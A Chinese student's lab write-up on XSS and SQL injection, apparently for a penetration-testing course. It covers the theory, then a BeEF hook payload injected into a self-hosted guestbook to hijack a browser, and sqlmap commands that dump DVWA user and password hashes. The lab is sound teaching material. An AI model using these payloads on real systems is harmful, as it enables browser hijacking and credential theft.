---
title: 「白帽子学习笔记」XSS和SQL注入
date: 2020-11-17 14:01:02
tags: [课程学习,网络渗透测试]
categories: [课程学习,网络渗透测试]
katex: true
---



# 【白帽子学习笔记】XSS和SQL注入

|yysy姚总布置的实验报告越来越难写了，菜菜的我要写好久，┭┮﹏┭┮|
|-

@[toc]
## 0x01 实验知识点
### 1x01 什么是XSS？
XSS又叫CSS (Cross Site Script) 也称为跨站，它是指**攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。**

**XSS攻击**是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。

### 1x02 什么是Cookie？
Cookie，有时也用其复数形式Cookies，指某些网站**为了辨别用户身份**、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。
Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。
<!--more-->
### 1x03 XSS漏洞的分类
**存储型 XSS**：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。
如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个**定时炸弹**放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。
存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。

**DOM-Based XSS漏洞**：	DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。
	由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。
	
**反射型XSS：**仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。

关于反射型的XSS漏洞，我之前的博客也有进行整理，链接如下

[【白帽子学习笔记13】DVWA 反射型XSS（跨站点脚本攻击）](https://blog.csdn.net/python_LC_nohtyp/article/details/106731406)

### 1x04 SQL注入攻击
所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。
**为什么会有SQL注入攻击？**
	很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。
因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。

关于SQL注入的常用语法我也有进行整理，链接如下：
[【白帽子学习笔记14】SQL注入常用语句](https://blog.csdn.net/python_LC_nohtyp/article/details/106862663)
[【白帽子学习笔记15】XVWA SQL Injection](https://blog.csdn.net/python_LC_nohtyp/article/details/107589604)

## 0x02 XSS部分：Beef
### 1x01 搭建GuestBook网站
本次实验中我在Win Server 2003中搭建了Guestbook环境（IIS），搭建过程中需要注意以下几点

- 在搭建IIS配置完成后注意将网站所在的文件夹权限打开，将Everyone用户组给到改文件夹的完全控制权限。
- 如果使用Windows Server可能需要手动配置一下IP和网关使其与其他虚拟机处于同一网段。
- 本次实验中虚拟机网络模式：Net模式

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117121506193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
### 1x02 AWVS扫描
首先我们使用AWVS扫描刚才搭建的网站

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111712280017.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117122818910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117122851886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
接下来一路继续就行，可能需要添加一个密码。然后就可以正常进行扫描了，扫描结果如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111712402383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117124044245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
发现在error.asp和add.asp分别都有一个XSS漏洞。

### 1x03 Kail中使用Beef生成恶意代码

现在Kail-2020中应该是没有自带Beef了，我们需要自己安装一下
`sudo apt-get install beef-xss`
然后cd进入到这个文件夹中：
`cd /usr/share/beef-xss `
输入：
`./beef`即可启动
第一次的时候可能会提醒你不要使用默认的账号和密码，就像下面这样：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117130054881.png#pic_center)
我们进入到提示的文件夹中进行一下修改
用vim打开一下：`sudo vim /etc/beef-xss/config.yaml`
不会使用vim的建议百度搜索一下用法，linux下经常会用到。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117130248992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
我把账号和密码都修改为了beeff，之后保存退出。再输入 `./beef`

- 使用默认用户可能会导致你安装失败
输入`su`然后输入root密码，切换为root权限，然后再输入`./beef`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117130624794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
会提示你现在已经启动了，然后打开kali中自带的firefox浏览器。进入到：
`http://127.0.0.1:3000/ui/authentication`
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111713111126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
输入你刚才设置的账号和密码，就可以成功的登陆了。

访问一下hook.js里面有自带的恶意代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111713564093.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
只要访问到这个网站，对方的浏览器就会被劫持。

### 1x04 XSS注入漏洞
#### 2x01 XSS劫持网站
现在使用自己的本机访问留言簿的网站，并将XSS注入恶意代码。
XSS注入代码如下：
`<script src="http://Kali的IP地址:3000/hook.js"></script>`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140452295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
现在进入到这个当中我们可以发现已经成功了，而且看不到刚才写的代码，说明代码已经被成功的加载进去了！
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140446773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
刷新一下界面，可以发现会有一个弹框：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140649183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
然后再回到kali里面的beef管理界面看一下，可以发现10.34.80.1也就是我的本机已经被劫持了！
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117140922301.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117141052958.png#pic_center)
可以使用他干一些奇怪的事情，还有查询一些信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117142326400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
#### 2x02 劫持浏览器指定被劫持网站为学校主页
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117150244138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
在命令中选择，Redirect Browser，填入学校地址，然后点击Execute。就可以发现网页被重定向了。

本次实验中的XSS攻击属于注入型XSS攻击。

## 0x02 SQL注入（DVWA+SQLMAP+Mysql）

### 1x01 实验环境搭建
打开Metasploitable2后，里面有搭建好的DVWA，访问`http://Metasploitable的IP/dvwa`即可
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161430968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
在low级别的SQL Injection中进行SQL注入的尝试：
输入1，可以正常显示：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161631674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
输入1' 报错
可以判断此处有报错：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117161723620.png#pic_center)
下面使用sqlmap进行攻击

**SQLMAP基本语法**：

- -u:指定目标URL
- --cookie：当前会话的cookies值
- -b：获取数据库类型，检查数据库管理系统标识
- --current-db：获取当前数据库
- --current-user：获取当前数据库使用的用户
- -string：当查询可用来匹配页面中的字符串
- -users：枚举DBMS用户
- -password：枚举DBMS用户密码hash
### 1x02 枚举当前数据库名称和用户名
查询一下当前的数据库：
`sqlmap -u "http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" --current-db`

- -u后是需要攻击的url
- 因为dvwa是需要登陆的，需要cookie用作身份验证，可以通过浏览器F12抓包获取
- --current-db表示查询当前数据库
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117163655704.png#pic_center)
然后查询一下当前的使用者：
`sqlmap -u "http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" --current-user
`
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020111716382474.png#pic_center)
### 1x03 枚举数据库用户名和密码

**枚举数据库的表名：**

因为我们是dvwa所以爆破dvwa数据库中的数据表

`sqlmap -u "http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" -D dvwa --tables
`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117164551451.png#pic_center)
**枚举数据表中的列名：**
根据上面的枚举结果，我们应该是要看users数据表中的内容：
`sqlmap -u "http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" -D dvwa -T users --columns
`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117164855105.png#pic_center)
**枚举数据表中的用户和密码：**
查询到users数据表中有那么多的字段，我们想要的数据应该就在user和password中了
`sqlmap -u "http://10.34.80.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "security=low; PHPSESSID=edc3d366bb72538cb8af3df2bbf19979" -D dvwa -T users -C user,password --dump
`
这里会询问你是否使用Kali中自带的字典进行攻击，选择是就好了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117165159959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3B5dGhvbl9MQ19ub2h0eXA=,size_16,color_FFFFFF,t_70#pic_center)
最后得到结果：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117165304520.png#pic_center)

## 0x03 实验小结

在本次的实验中学习了两种最常见的漏洞：XSS漏洞和SQL注入漏洞，在实验过程中具体的掌握了如下知识点：

- 如何使用扫描器AWVS
- 如何向网站中注入XSS漏洞
- 如何使用Beef利用网站中的XSS漏洞
- 如何使用SQLMAP利用网站的注入漏洞





















